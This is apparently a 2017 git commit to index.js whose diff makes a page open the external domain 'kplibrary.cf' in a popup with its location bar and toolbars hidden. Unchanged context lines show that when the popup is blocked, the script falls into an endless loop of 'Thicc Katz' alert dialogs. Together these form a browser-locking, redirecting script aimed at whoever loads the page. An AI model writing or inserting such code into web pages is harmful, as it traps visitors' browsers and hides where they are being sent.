9c424ab0e18f7f041b8e7fe478ac51916b5c6e9f
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-08 19:04:36 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,5 +1,5 @@
 var windowName = 'userConsole';
-var popUp = window.open('/popup-page.php', windowName, 'width=1000, height=700, left=24, top=24, scrollbars, resizable');
+var popUp = window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
 if (popUp == null || typeof(popUp) == 'undefined') {
   while (true) {
     alert("Thicc Katz")
